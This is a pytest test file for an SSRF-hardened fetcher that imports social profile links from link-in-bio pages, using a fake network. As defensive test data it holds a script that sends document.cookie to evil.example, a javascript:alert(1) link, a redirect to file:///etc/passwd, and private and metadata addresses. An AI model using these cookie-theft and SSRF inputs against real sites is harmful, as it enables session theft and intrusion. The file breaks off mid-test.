"""Link-in-bio import (biofetch.py, #11): the one page FeedVault fetches.

No test opens a socket: the fetcher's resolver, connect, TLS layer and
clock are fakes here (Net), and the endpoint's FETCHER is replaced. Every
page below is hand-written, not a copy of a real one.
"""
import socket
import ssl

import pytest

from conftest import H

import biofetch

PUBLIC = "93.184.215.14"
PUBLIC6 = "2606:2800:21f:cb07:6820:80da:af6b:8b2c"


@pytest.fixture(autouse=True)
def fresh_guard(monkeypatch):
    """Each test starts with no fetch behind it (the MIN_GAP guard)."""
    monkeypatch.setattr(biofetch, "_last", [None])


class Clock:
    def __init__(self):
        self.t = 1000.0

    def __call__(self):
        return self.t


def html_answer(body=b"<html><body>hi</body></html>", status="200 OK", headers=None, length=True):
    head = {"Content-Type": "text/html; charset=utf-8"}
    if length:
        head["Content-Length"] = str(len(body))
    head.update(headers or {})
    lines = [f"HTTP/1.1 {status}"] + [f"{k}: {v}" for k, v in head.items() if v is not None]
    return ("\r\n".join(lines) + "\r\n\r\n").encode() + body


def redirect(location, status="302 Found"):
    return html_answer(b"", status=status, headers={"Location": location})


class FakeSock:
    """A connected socket (and its TLS layer, the fake wrap returns it): the
    answer the Net has for the request sent, in ``chunk``-byte pieces, each
    taking ``delay`` seconds of the fake clock."""

    def __init__(self, net, family, sockaddr):
        self.net, self.family, self.sockaddr = net, family, sockaddr
        self.sent, self.timeouts, self.host, self.closed = b"", [], None, False
        self.out = None

    def settimeout(self, t):
        assert t is None or t > 0
        self.timeouts.append(t)

    def sendall(self, data):
        self.sent += data
        if b"\r\n\r\n" in self.sent and self.out is None:
            path = self.sent.split(b" ", 2)[1].decode()
            answer = self.net.pages.get((self.host, path))
            assert answer is not None, f"no page for {self.host}{path}"
            self.out = answer() if callable(answer) else answer

    def recv(self, n):
        if self.net.recv_error:
            raise self.net.recv_error
        left = self.timeouts[-1] if self.timeouts else None
        if left is not None and self.net.delay > left:      # as a real socket would: no data in time
            self.net.clock.t += left
            raise socket.timeout("timed out")
        self.net.clock.t += self.net.delay
        n = min(n, self.net.chunk)
        piece, self.out = self.out[:n], self.out[n:]
        return piece

    def close(self):
        self.closed = True


class Net:
    """The fake network: DNS answers, pages by (host, path), and a record
    of every lookup, connect and TLS host name."""

    def __init__(self, dns=None, pages=None):
        self.dns = {"linktr.ee": [PUBLIC], **(dns or {})}
        self.pages = pages or {}
        self.clock = Clock()
        self.lookups, self.connects, self.tls = [], [], []
        self.delay, self.chunk, self.recv_error = 0.0, 1 << 20, None
        self.socks, self.sleeps = [], []

    def sleep(self, t):
        self.sleeps.append(t)
        self.clock.t += t

    def resolve(self, host, port, timeout):
        assert port == 443 and timeout > 0
        self.lookups.append(host)
        out = []
        for ip in self.dns.get(host, []):
            if ":" in ip:
                out.append((socket.AF_INET6, (ip, port, 0, 0)))
            else:
                out.append((socket.AF_INET, (ip, port)))
        return out

    def connect(self, family, sockaddr, timeout):
        assert timeout > 0
        self.connects.append(sockaddr[0])
        s = FakeSock(self, family, sockaddr)
        self.socks.append(s)
        return s

    def wrap(self, sock, host):
        self.tls.append((sock.sockaddr[0], host))
        sock.host = host
        return sock

    def fetcher(self, **kw):
        return biofetch.Fetcher(resolve=self.resolve, connect=self.connect, wrap=self.wrap, clock=self.clock,
                                sleep=self.sleep, **kw)

    def get(self, url, **kw):
        return self.fetcher(**kw).fetch(url)


def refused(net, url, **kw):
    with pytest.raises(biofetch.Refused) as e:
        net.get(url, **kw)
    return str(e.value)


# ---------------------------------------------------------------------------
# The link
# ---------------------------------------------------------------------------

@pytest.mark.parametrize("url, error", [
    ("http://linktr.ee/alice", "only https links"),
    ("ftp://linktr.ee/alice", "only https links"),
    ("https://linktr.ee:8443/alice", "only https's own port"),
    ("https://linktr.ee:80/alice", "only https's own port"),
    ("https://user:pw@linktr.ee/alice", "login part"),
    ("https://linktr.ee@evil.example/alice", "login part"),
    ("https://evil.example/alice", "not an allowed site: evil.example"),
    ("https://linktr.ee.evil.example/alice", "not an allowed site"),
    ("https://evil.linktr.ee/alice", "not an allowed site"),           # no subdomains
    ("https://xlinktr.ee/alice", "not an allowed site"),
    ("https://lіnktr.ee/alice", "not an allowed site: xn--"),     # a Cyrillic look-alike
    ("https://xn--lnktr-3ve.ee/alice", "not an allowed site"),
    ("https://93.184.215.14/alice", "not an allowed site"),
    ("https://[::1]/alice", "not an allowed site"),
    ("https://linktr.ee../alice", "not an allowed site"),
    ("https://linktr.ee/al ice", "spaces or control characters"),
    ("https://linktr.ee/al\tice", "spaces or control characters"),
    ("https://linktr.ee/al\x00ice", "spaces or control characters"),
    ("https://linktr.ee/al\x7fice", "spaces or control characters"),
    ("https://linktr.ee\\@evil.example/", "spaces or control characters"),
    ("https://linktr.ee/", "not the site's home page"),
    ("https://linktr.ee", "not the site's home page"),
    ("", "paste a link-in-bio page's link"),
    ("https://" + "a" * 2000, "too long"),
    ("https://linktr.ee:99999/a", "not a link"),
])
def test_links_refused_before_anything_is_looked_up(url, error):
    net = Net()
    assert error in refused(net, url)
    assert net.lookups == net.connects == []


@pytest.mark.parametrize("url", [
    "https://linktr.ee/alice", "linktr.ee/alice", "https://LINKTR.EE/alice", "https://linktr.ee./alice",
    "https://www.linktr.ee/alice", "https://ｌｉｎｋｔｒ.ｅｅ/alice",   # fullwidth
    "https://linktr.ee:443/alice", "  https://linktr.ee/alice  ",
])
def test_allowed_forms_of_an_allowed_host(url):
    net = Net(pages={("linktr.ee", "/alice"): html_answer()})
    page = net.get(url)
    assert page.url == "https://linktr.ee/alice" and "hi" in page.text
    assert net.lookups == ["linktr.ee"] and net.tls == [(PUBLIC, "linktr.ee")]


@pytest.mark.parametrize("url", ["https://link.me/alice", "link.me/alice", "https://www.link.me/alice"])
def test_linkme_pages_are_allowed(url):
    net = Net(dns={"link.me": [PUBLIC]}, pages={("link.me", "/alice"): html_answer()})
    assert net.get(url).url == "https://link.me/alice"
    assert net.lookups == ["link.me"] and net.tls == [(PUBLIC, "link.me")]


@pytest.mark.parametrize("url, error", [
    ("https://link.me/", "not the site's home page"),
    ("https://media.link.me/alice", "not an allowed site: media.link.me"),
    ("https://about.link.me/alice", "not an allowed site: about.link.me"),
])
def test_linkme_home_and_subdomains_are_refused(url, error):
    net = Net()
    assert error in refused(net, url)
    assert net.lookups == net.connects == []


def test_every_allowed_site_has_a_reason_and_is_a_plain_host():
    for host, why in {**biofetch.SITES, **biofetch.SUBDOMAIN_SITES}.items():
        assert why and biofetch._host(host) == host and not host.startswith("www.")
    assert not set(biofetch.SITES) & set(biofetch.SUBDOMAIN_SITES)
    assert set(biofetch.REDIRECT_LINKS) <= {*biofetch.SITES, *biofetch.SUBDOMAIN_SITES}


# ---------------------------------------------------------------------------
# Addresses
# ---------------------------------------------------------------------------

@pytest.mark.parametrize("address", [
    "127.0.0.1", "10.0.0.1", "172.16.5.4", "192.168.1.1", "169.254.169.254", "100.64.0.1", "0.0.0.0",
    "224.0.0.1", "239.255.255.250", "255.255.255.255", "198.18.0.1", "192.0.2.1", "240.0.0.1",
    "::1", "::", "fe80::1", "fe80::1%eth0", "fc00::1", "fd12:3456::1", "ff02::1", "ff0e::1", "2001:db8::1",
    "::ffff:127.0.0.1", "::ffff:93.184.215.14",             # mapped: refused even to a public IPv4
    "::127.0.0.1", "64:ff9b::7f00:1", "64:ff9b::808:808", "2002:7f00:1::1", "2002:5db8:d70e::1",
    "2001:0:4136:e378:8000:63bf:3fff:fdd2",                 # Teredo
    "not an address",
])
def test_addresses_that_are_not_public(address):
    assert not biofetch.public(address)
    net = Net(dns={"linktr.ee": [address]})
    assert "address is not public" in refused(net, "https://linktr.ee/alice")
    assert net.connects == []


@pytest.mark.parametrize("address", [PUBLIC, PUBLIC6, "8.8.8.8", "2a00:1450:4001:80b::200e"])
def test_public_addresses(address):
    assert biofetch.public(address)


def test_one_public_and_one_private_address_is_refused():
    for dns in ([PUBLIC, "10.0.0.7"], ["10.0.0.7", PUBLIC], [PUBLIC6, "::1"]):
        net = Net(dns={"linktr.ee": dns})
        assert "address is not public" in refused(net, "https://linktr.ee/alice")
        assert net.connects == []


def test_no_address():
    net = Net(dns={"linktr.ee": []})
    assert "no address found" in refused(net, "https://linktr.ee/alice")


def test_it_connects_to_the_checked_address_with_tls_on_the_name():
    """One lookup per hop, the connection to an address from it (never a
    second lookup the DNS could answer differently), TLS sent the host name."""
    answers = iter([[PUBLIC], ["127.0.0.1"]])                # a rebinding DNS: public, then loopback

    net = Net(pages={("linktr.ee", "/alice"): html_answer()})
    net.dns = {}
    net.resolve = lambda host, port, timeout: (net.lookups.append(host) or
                                               [(socket.AF_INET, (ip, port)) for ip in next(answers)])
    net.get("https://linktr.ee/alice")
    assert net.lookups == ["linktr.ee"]
    assert net.connects == [PUBLIC] and net.tls == [(PUBLIC, "linktr.ee")]
    assert net.socks[0].sockaddr == (PUBLIC, 443)


def test_the_next_checked_address_when_one_does_not_answer():
    net = Net(dns={"linktr.ee": [PUBLIC6, PUBLIC]}, pages={("linktr.ee", "/alice"): html_answer()})
    connect = net.connect

    def refuse_v6(family, sockaddr, timeout):
        if family == socket.AF_INET6:
            net.connects.append(sockaddr[0])
            raise ConnectionRefusedError(111, "Connection refused")
        return connect(family, sockaddr, timeout)
    net.connect = refuse_v6
    net.get("https://linktr.ee/alice")
    assert net.connects == [PUBLIC6, PUBLIC] and net.lookups == ["linktr.ee"]


def test_nothing_answers():
    net = Net()

    def refuse(family, sockaddr, timeout):
        raise ConnectionRefusedError(111, "Connection refused")
    net.connect = refuse
    assert "could not reach linktr.ee: Connection refused" in refused(net, "https://linktr.ee/alice")


def test_the_real_tls_layer_checks_the_certificate_and_name():
    ctx = biofetch.tls_context()
    assert ctx.check_hostname and ctx.verify_mode == ssl.CERT_REQUIRED
    assert ctx.minimum_version >= ssl.TLSVersion.TLSv1_2


def test_certificate_errors_are_refused():
    net = Net()

    def bad_cert(sock, host):
        raise ssl.SSLCertVerificationError("certificate verify failed: Hostname mismatch")
    net.wrap = bad_cert
    assert refused(net, "https://linktr.ee/alice") == "linktr.ee's certificate is not valid"
    assert net.socks[0].closed


# ---------------------------------------------------------------------------
# What is sent: nothing from the environment
# ---------------------------------------------------------------------------

def test_the_request_has_no_proxy_cookie_auth_or_referer(monkeypatch, tmp_path):
    for var in ("HTTPS_PROXY", "https_proxy", "HTTP_PROXY", "http_proxy", "ALL_PROXY", "all_proxy"):
        monkeypatch.setenv(var, "http://10.9.9.9:3128")
    monkeypatch.setenv("NO_PROXY", "")
    import os
    with open(os.path.join(os.environ["HOME"], ".netrc"), "w") as f:
        f.write("machine linktr.ee login alice password secret\n")
    net = Net(pages={("linktr.ee", "/alice?x=1"): html_answer()})
    net.get("https://linktr.ee/alice?x=1#frag")
    assert net.connects == [PUBLIC]                          # not the proxy
    sent = net.socks[0].sent.decode()
    head = sent.split("\r\n")
    assert head[0] == "GET /alice?x=1 HTTP/1.1"
    names = {line.split(":", 1)[0].lower() for line in head[1:] if line}
    assert names == {"host", "user-agent", "accept", "accept-encoding", "connection"}
    assert "Host: linktr.ee" in head and "Accept-Encoding: identity" in head and "Connection: close" in head
    assert any(line.startswith("User-Agent: FeedVault/") for line in head)
    assert "secret" not in sent and "frag" not in sent


def test_odd_path_characters_are_percent_encoded():
    net = Net(pages={("linktr.ee", "/%C3%A9l%22e"): html_answer()})
    page = net.get('https://linktr.ee/él"e')
    assert page.url == "https://linktr.ee/%C3%A9l%22e"


# ---------------------------------------------------------------------------
# Redirects
# ---------------------------------------------------------------------------

def test_redirects_are_followed_and_each_checked_again():
    net = Net(dns={"beacons.ai": [PUBLIC6]}, pages={
        ("linktr.ee", "/a"): redirect("/b", "301 Moved Permanently"),
        ("linktr.ee", "/b"): redirect("https://beacons.ai/c"),
        ("beacons.ai", "/c"): redirect("https://www.beacons.ai/d", "308 Permanent Redirect"),
        ("beacons.ai", "/d"): html_answer(b"<p>done</p>"),
    })
    page = net.get("https://linktr.ee/a")
    assert page.url == "https://beacons.ai/d" and "done" in page.text
    assert net.lookups == ["linktr.ee", "linktr.ee", "beacons.ai", "beacons.ai"]
    assert net.tls == [(PUBLIC, "linktr.ee")] * 2 + [(PUBLIC6, "beacons.ai")] * 2


def test_too_many_redirects():
    pages = {("linktr.ee", f"/{i}"): redirect(f"/{i + 1}") for i in range(5)}
    net = Net(pages=pages)
    assert refused(net, "https://linktr.ee/0") == "too many redirects"
    assert len(net.connects) == 4                            # the page and 3 redirects, no fifth request


@pytest.mark.parametrize("location, error", [
    ("https://evil.example/x", "not an allowed site"),
    ("http://linktr.ee/x", "only https links"),
    ("https://linktr.ee:8080/x", "port"),
    ("//evil.example/x", "not an allowed site"),
    ("https://a@linktr.ee/x", "login part"),
    ("https://beacons.ai/private", "address is not public"),
    ("file:///etc/passwd", "only https links"),
])
def test_a_redirect_to_somewhere_refused(location, error):
    net = Net(dns={"beacons.ai": ["192.168.0.10"]}, pages={("linktr.ee", "/a"): redirect(location)})
    message = refused(net, "https://linktr.ee/a")
    assert error in message and ("redirects elsewhere" in message or "not public" in message)
    assert net.connects == [PUBLIC]


def test_a_redirect_with_nowhere_to_go():
    net = Net(pages={("linktr.ee", "/a"): html_answer(b"", status="302 Found")})
    assert "nowhere to go" in refused(net, "https://linktr.ee/a")


# ---------------------------------------------------------------------------
# The answer
# ---------------------------------------------------------------------------

@pytest.mark.parametrize("answer, error", [
    (html_answer(status="404 Not Found"), "the site answered 404"),
    (html_answer(status="500 Oops"), "the site answered 500"),
    (html_answer(status="304 Not Modified"), "the site answered 304"),
    (html_answer(headers={"Content-Type": "application/json"}), "not a web page (application/json)"),
    (html_answer(headers={"Content-Type": None}), "not a web page (no type)"),
    (html_answer(headers={"Content-Type": "text/htmlx"}), "not a web page"),
    (html_answer(headers={"Content-Encoding": "gzip"}), "compressed"),
    (html_answer(headers={"Content-Encoding": "br"}), "compressed"),
    (html_answer(headers={"Transfer-Encoding": "gzip, chunked"}, length=False), "encoding that is refused"),
    (b"SSH-2.0-OpenSSH\r\n\r\n", "not HTTP"),
    (b"HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n", "closed the connection early"),
    (b"HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nContent-Length: 50\r\n\r\nshort", "cut short"),
    (b"HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nContent-Length: -1\r\n\r\n", "malformed"),
    (b"HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nContent-Length: \xb2\r\n\r\nab", "malformed"),
    (b"HTTP/1.1 200 OK\r\nContent-Length: 1\r\nContent-Length: 2\r\nContent-Type: text/html\r\n\r\nab",
     "malformed"),
    (b"HTTP/1.1 200 OK\r\n bad: fold\r\n\r\n", "malformed"),
    (b"HTTP/1.1 200 OK\r\n" + b"X-A: b\r\n" * 101 + b"\r\n", "too many headers"),
    (b"HTTP/1.1 200 OK\r\nX: " + b"a" * 40000 + b"\r\n\r\n", "malformed"),
])
def test_answers_refused(answer, error):
    net = Net(pages={("linktr.ee", "/a"): answer})
    assert error in refused(net, "https://linktr.ee/a")
    assert all(s.closed for s in net.socks)


def test_too_large_with_a_length():
    big = b"x" * 3000
    net = Net(pages={("linktr.ee", "/a"): html_answer(big)})
    assert refused(net, "https://linktr.ee/a", max_bytes=2000) == "page too large"


def test_too_large_counted_while_reading():
    """No length: read until the site closes, refused as soon as it is past
    the limit, without reading the rest."""
    sent = {"n": 0}

    def endless():
        sent["n"] += 1
        return html_answer(b"y" * 100_000, length=False)
    net = Net(pages={("linktr.ee", "/a"): endless})
    net.chunk = 1000
    assert refused(net, "https://linktr.ee/a", max_bytes=5000) == "page too large"
    assert len(net.socks[0].out) > 90_000                    # most of it never read


def test_too_large_chunked():
    body = b"".join(b"3e8\r\n" + b"z" * 1000 + b"\r\n" for _ in range(10)) + b"0\r\n\r\n"
    net = Net(pages={("linktr.ee", "/a"): html_answer(body, headers={"Transfer-Encoding": "chunked"}, length=False)})
    assert refused(net, "https://linktr.ee/a", max_bytes=5000) == "page too large"


def test_the_default_limits():
    f = biofetch.Fetcher()
    assert (f.timeout, f.max_bytes, f.max_redirects) == (10, 2 * 1024 * 1024, 3)
    assert (f.max_lookups, f.import_time, biofetch.LOOKUP_GAP, biofetch.LOOKUP_TIMEOUT) == (30, 40, 0.4, 5)


def test_chunked_and_charset():
    body = "<p>café</p>".encode("latin-1")
    chunked = b"%x;ext=1\r\n%s\r\n0\r\nX-Trailer: 1\r\n\r\n" % (len(body), body)
    net = Net(pages={("linktr.ee", "/a"): html_answer(chunked, length=False, headers={
        "Transfer-Encoding": "chunked", "Content-Type": "text/html; charset=ISO-8859-1"})})
    net.chunk = 3                                            # in small pieces
    assert net.get("https://linktr.ee/a").text == "<p>café</p>"


def test_until_close_and_odd_charset():
    net = Net(pages={("linktr.ee", "/a"): html_answer(b"<p>ok \xff</p>", length=False, headers={
        "Content-Type": "TEXT/HTML; charset=no-such-charset"})})
    assert net.get("https://linktr.ee/a").text == "<p>ok �</p>"


# ---------------------------------------------------------------------------
# Time: one limit for the whole fetch
# ---------------------------------------------------------------------------

def test_a_slow_drip_times_out_on_the_total():
    """A byte at a time, each well within any per-read limit: the whole
    fetch still stops at the total time."""
    net = Net(pages={("linktr.ee", "/a"): html_answer(b"d" * 500)})
    net.chunk, net.delay = 1, 0.5
    assert refused(net, "https://linktr.ee/a") == "timed out"
    assert net.clock.t - 1000 <= 10.5
    timeouts = net.socks[0].timeouts
    assert timeouts == sorted(timeouts, reverse=True) and max(timeouts) <= 10   # each read: the time left


def test_slow_headers_time_out_too():
    net = Net(pages={("linktr.ee", "/a"): b"HTTP/1.1 200 OK\r\n" + b"X-Slow: 1\r\n" * 90})
    net.chunk, net.delay = 4, 0.2
    assert refused(net, "https://linktr.ee/a") == "timed out"


def test_slow_redirects_share_the_limit():
    pages = {("linktr.ee", f"/{i}"): redirect(f"/{i + 1}") for i in range(3)}
    pages["linktr.ee", "/3"] = html_answer()
    net = Net(pages=pages)
    net.delay = 3                                            # each hop's answer is one 3 s read: 4 hops, 12 s
    assert refused(net, "https://linktr.ee/0") == "timed out"


def test_a_socket_timeout_is_timed_out():
    net = Net(pages={("linktr.ee", "/a"): html_answer()})
    net.recv_error = socket.timeout("timed out")
    assert refused(net, "https://linktr.ee/a") == "timed out"


def test_a_slow_lookup_times_out(monkeypatch):
    import threading
    release = threading.Event()

    def slow(*a, **kw):
        release.wait(5)
        return []
    monkeypatch.setattr(socket, "getaddrinfo", slow)
    try:
        with pytest.raises(socket.timeout):
            biofetch.system_resolve("linktr.ee", 443, 0.05)
    finally:
        release.set()


def test_the_system_lookup_asks_for_tcp_on_443(monkeypatch):
    asked = []

    def fake(host, port, **kw):
        asked.append((host, port, kw))
        return [(socket.AF_INET, socket.SOCK_STREAM, 6, "", (PUBLIC, 443))]
    monkeypatch.setattr(socket, "getaddrinfo", fake)
    assert biofetch.system_resolve("linktr.ee", 443, 1) == [(socket.AF_INET, (PUBLIC, 443))]
    assert asked == [("linktr.ee", 443, {"type": socket.SOCK_STREAM, "proto": socket.IPPROTO_TCP})]


def test_the_system_connect_uses_the_address_it_is_given(monkeypatch):
    made = []

    class Raw:
        def __init__(self, family, kind):
            self.calls = [("new", family, kind)]
            made.append(self)

        def settimeout(self, t):
            self.calls.append(("timeout", t))

        def connect(self, address):
            self.calls.append(("connect", address))

        def close(self):
            self.calls.append(("close",))
    monkeypatch.setattr(socket, "socket", Raw)
    monkeypatch.setattr(socket, "getaddrinfo", lambda *a, **kw: pytest.fail("looked up"))
    biofetch.system_connect(socket.AF_INET6, (PUBLIC6, 443, 0, 0), 4.5)
    assert made[0].calls == [("new", socket.AF_INET6, socket.SOCK_STREAM), ("timeout", 4.5),
                             ("connect", (PUBLIC6, 443, 0, 0))]


# ---------------------------------------------------------------------------
# One at a time, a few seconds apart
# ---------------------------------------------------------------------------

def test_one_fetch_at_a_time_and_a_gap(monkeypatch):
    net = Net(pages={("linktr.ee", "/a"): html_answer()})
    monkeypatch.setattr(biofetch, "FETCHER", net.fetcher())
    clock = Clock()
    assert biofetch.fetch("https://linktr.ee/a", clock=clock).text
    clock.t += 1
    with pytest.raises(biofetch.Refused) as e:
        biofetch.fetch("https://linktr.ee/a", clock=clock)
    assert e.value.status == 429 and "between two imports" in str(e.value)
    # A link refused before anything is fetched neither waits nor counts.
    with pytest.raises(biofetch.Refused) as e:
        biofetch.fetch("https://evil.example/a", clock=clock)
    assert e.value.status == 400
    clock.t += biofetch.MIN_GAP
    assert biofetch.fetch("https://linktr.ee/a", clock=clock).text
    assert len(net.connects) == 2
    clock.t += 100
    with biofetch._busy:                                     # another one under way
        with pytest.raises(biofetch.Refused) as e:
            biofetch.fetch("https://linktr.ee/a", clock=clock)
    assert e.value.status == 429 and "another" in str(e.value)
    assert len(net.connects) == 2


# ---------------------------------------------------------------------------
# The switch
# ---------------------------------------------------------------------------

def test_the_switch_is_off_by_default_and_saved_with_the_settings(env, client):
    assert client.get("/api/config", headers=H).get_json()["bio_import"] is False
    r = client.post("/api/config", json={"bio_import": "yes"}, headers=H).get_json()
    assert r["ok"] is False and "bio_import" in r["error"]
    assert client.post("/api/config", json={"bio_import": True}, headers=H).get_json()["ok"]
    assert client.get("/api/config", headers=H).get_json()["bio_import"] is True
    import config
    assert config.load()["bio_import"] is True and biofetch.enabled(config.load())
    client.post("/api/config", json={"bio_import": False}, headers=H)
    assert not biofetch.enabled(config.load())


# ---------------------------------------------------------------------------
# Parsing (hand-written pages, shaped like what these sites serve)
# ---------------------------------------------------------------------------

ROUTES = {"instagram.com": "instaloader", "x.com": "gallery-dl", "twitter.com": "gallery-dl",
          "youtube.com": "yt-dlp", "tiktok.com": "yt-dlp", "bsky.app": "gallery-dl"}

# A Next.js link page: the links are in __NEXT_DATA__, the anchors drawn by
# its scripts (which never run here).
NEXT_PAGE = """<!DOCTYPE html><html><head><title>Alice | Linktree</title>
<script>window.evil = function () { fetch("https://evil.example/" + document.cookie) }</script>
<script id="__NEXT_DATA__" type="application/json">
{"props": {"pageProps": {"account": {"username": "alice",
  "socialLinks": [{"type": "INSTAGRAM", "url": "https://www.instagram.com/alice.example/"},
                  {"type": "TIKTOK", "url": "https://www.tiktok.com/@new.one?lang=en"}],
  "links": [{"title": "My shop", "url": "https://shop.example/alice"},
            {"title": "X", "url": "https://x.com/Example_User1"},
            {"title": "Videos", "url": "https://www.youtube.com/@alicevids/videos"},
            {"title": "Latest", "url": "https://www.youtube.com/watch?v=abc"},
            {"title": "Report", "url": "https://linktr.ee/s/about/trust-center/report"},
            {"title": "nested", "deep": [[{"u": "HTTPS://bsky.app/profile/alice.bsky.social"}]]},
            {"title": "not a link", "url": "instagram.com/notalink"}]}}}}
</script></head><body><div id="__next"></div></body></html>"""

ANCHOR_PAGE = """<html><body>
<a href="https://instagram.com/alice.example">Instagram</a>
<a href="https://www.instagram.com/alice.example/">Instagram again</a>
<a href="https://x.com/example_user1/status/123">a post</a>
<a href="https://twitter.com/example_user1">X</a>
<a href="https://www.instagram.com/p/C8xYz/">a post</a>
<a href="https://x.com/intent/follow?screen_name=alice">follow</a>
<a href="https://tiktok.com/new.one">no @</a>
<a href="mailto:alice@example.com">mail</a><a href="javascript:alert(1)">js</a><a href="/relative">rel</a>
<area href="https://bsky.app/profile/alice.bsky.social">
<a href="https://www.youtube.com/channel/UC1234567890abcdefghij/">channel</a>
<a href="https://www.instagram.com/alice&#46;example/">entity</a>
</body></html>"""


def test_links_from_next_data():
    links = biofetch.page_links(NEXT_PAGE)
    assert "https://evil.example/" not in " ".join(links)              # script text is never read
    assert "instagram.com/notalink" not in links
    assert "HTTPS://bsky.app/profile/alice.bsky.social" in links
    r = {(p[0], p[1]) for p in filter(None, (biofetch.profile(link, ROUTES) for link in links))}
    assert r == {("instagram", "alice.example"), ("tiktok", "new.one"), ("twitter", "Example_User1"),
                 ("youtube", "alicevids"), ("bluesky", "alice.bsky.social")}


def test_links_from_anchors_and_what_is_not_a_profile():
    links = biofetch.page_links(ANCHOR_PAGE)
    assert not any(link.startswith(("mailto", "javascript", "/")) for link in links)
    found = [biofetch.profile(link, ROUTES) for link in links]
    profiles = [(f[0], f[1]) for f in found if f]
    assert profiles == [("instagram", "alice.example"), ("instagram", "alice.example"),
                        ("twitter", "example_user1"), ("bluesky", "alice.bsky.social"),
                        ("youtube", "UC1234567890abcdefghij")]    # the &#46; one is the first, unescaped
    refused = [link for link, f in zip(links, found) if not f]
    assert refused == ["https://x.com/example_user1/status/123", "https://www.instagram.com/p/C8xYz/",
                       "https://x.com/intent/follow?screen_name=alice", "https://tiktok.com/new.one"]


@pytest.mark.parametrize("text", [
    "", "<html>", "no markup at all", "<a href=", "<a href='https://x.com/a'", "<<<>>><!--", "<!", "<![CDATA[",
    "<script id=__NEXT_DATA__>{not json", '<script type="application/json">' + "[" * 100000,
    "\x00\x01<a href='https://x.com/ok'>", "<a href=\"https://x.com/fine\"><b><i></a></b>",
])
def test_malformed_pages_give_what_they_can(text):
    links = biofetch.page_links(text)
    assert links in ([], ["https://x.com/ok"], ["https://x.com/fine"])


def test_links_are_bounded():
    page = "".join(f'<a href="https://x.com/u{i}">' for i in range(5000))
    assert len(biofetch.page_links(page)) == biofetch.MAX_LINKS
    blob = '<script type="application/json">' + json_list(300_000) + "</script>"
    assert len(biofetch.page_links(blob)) < 300_000


def json_list(n):
    import json
    return json.dumps(["https://x.com/j%d" % i for i in range(n)])


# ---------------------------------------------------------------------------
# The endpoint, end to end with a fake fetcher
# ---------------------------------------------------------------------------

def bio_net(page, path="/alice"):
    return Net(pages={("linktr.ee", path): html_answer(page.encode())})


@pytest.fixture
def bio(env, client, monkeypatch):
    """Alice (alice.example linked), Bob (bob.example), X example_user1 and
    TikTok example_user6 indexed and linked to nobody; the switch on."""
    from test_people import archive, account, create, post
    archive(env)
    alice = create(client, "Alice", account(client, "instagram", "alice.example"))["person"]
    create(client, "Bob", account(client, "instagram", "bob.example"))
    post(client, "/api/config", {"bio_import": True})
    monkeypatch.setattr(biofetch, "MIN_GAP", 0)
    return alice


def person_links(client, pid):
    """A person's saved links in the order they were saved, as GET /api/people/<id> gives them."""
    r = client.get(f"/api/people/{pid}", headers=H)
    assert r.status_code == 200, r.get_json()
    return sorted(r.get_json()["links"], key=lambda x: x["position"])


def saved(client, pid):
    return [(x["url"], x["title"]) for x in person_links(client, pid)]


def bio_import(client, pid, url="https://linktr.ee/alice", status=200, headers=H):
    r = client.post(f"/api/people/{pid}/bio-import", json={"url": url}, headers=headers)
    assert r.status_code == status, r.get_json()
    return r.get_json()


def test_import_end_to_end(bio, client, monkeypatch):
    from test_people import post
    post(client, "/api/sources", {"target": "https://bsky.app/profile/alice.bsky.social"})   # a source of nobody
    net = bio_net(NEXT_PAGE + ANCHOR_PAGE)
    monkeypatch.setattr(biofetch, "FETCHER", net.fetcher())
    r = bio_import(client, bio["id"])
    assert r["ok"] and r["url"] == "https://linktr.ee/alice"
    got = {(a["platform"], a["handle"]): a for a in r["accounts"]}
    assert {k: a["status"] for k, a in got.items()} == {
        ("instagram", "alice.example"): "linked", ("tiktok", "new.one"): "new",
        ("twitter", "example_user1"): "indexed", ("youtube", "alicevids"): "new",
        ("bluesky", "alice.bsky.social"): "source", ("youtube", "UC1234567890abcdefghij"): "new"}
    # Anchors come first: twitter.com/example_user1, and x.com/Example_User1 from the JSON is the same one.
    x = got["twitter", "example_user1"]
    assert x["account"]["id"] == "641286" and x["person"] is None and x["url"] == "https://twitter.com/example_user1"
    assert got["instagram", "alice.example"]["person"] == {"id": bio["id"], "name": "Alice"}
    assert got["instagram", "alice.example"]["url"] == "https://instagram.com/alice.example"
    assert got["tiktok", "new.one"]["url"] == "https://tiktok.com/@new.one"         # query dropped
    # The link the dashboard shows is FeedVault's own for the platform, or none.
    assert {k: a["profile_url"] for k, a in got.items()} == {
        ("instagram", "alice.example"): "https://www.instagram.com/alice.example/",
        ("tiktok", "new.one"): "https://www.tiktok.com/@new.one", ("twitter", "example_user1"): "https://x.com/example_user1",
        ("youtube", "alicevids"): "https://www.youtube.com/@alicevids", ("bluesky", "alice.bsky.social"): None,
        ("youtube", "UC1234567890abcdefghij"): None}
    # The page and every link it shows are in Alice's Links, anchors first,
    # a link once whatever its spelling (www., a last slash); the mailto:
    # and javascript: ones are refused, and the site's own Report page and
    # "instagram.com/notalink" are not links to keep.
    assert "other" not in r
    assert r["links"] == {"saved": 14, "already": 1,"shared": 0, "over": 0, "dropped": 2}
    assert saved(client, bio["id"]) == [
        ("https://linktr.ee/alice", ""), ("https://instagram.com/alice.example", "Instagram"),
        ("https://x.com/example_user1/status/123", "a post"), ("https://twitter.com/example_user1", "X"),
        ("https://www.instagram.com/p/C8xYz/", "a post"), ("https://x.com/intent/follow?screen_name=alice", "follow"),
        ("https://tiktok.com/new.one", "no @"), ("https://bsky.app/profile/alice.bsky.social", ""),
        ("https://www.youtube.com/channel/UC1234567890abcdefghij/", "channel"),
        ("https://www.tiktok.com/@new.one", ""), ("https://shop.example/alice", "My shop"),
        ("https://x.com/Example_User1", "X"), ("https://www.youtube.com/@alicevids/videos", "Videos"),
        ("https://www.youtube.com/watch?v=abc", "Latest")]
    assert net.connects == [PUBLIC]
    # No account and no source was added.
    from test_people import get, links
    assert links() == [("Alice", "instagram", "111"), ("Bob", "instagram", "222")]
    before = len(get(client, "/api/sources")["sources"])
    assert before == 1

    # The user adds two, through the usual calls; the next import says so.
    post(client, f"/api/people/{bio['id']}/accounts", {"add": [{"platform": "twitter", "id": "641286"}]})
    post(client, "/api/sources", {"target": got["tiktok", "new.one"]["url"], "person": bio["id"]})
    r = bio_import(client, bio["id"])
    status = {(a["platform"], a["handle"]): a["status"] for a in r["accounts"]}
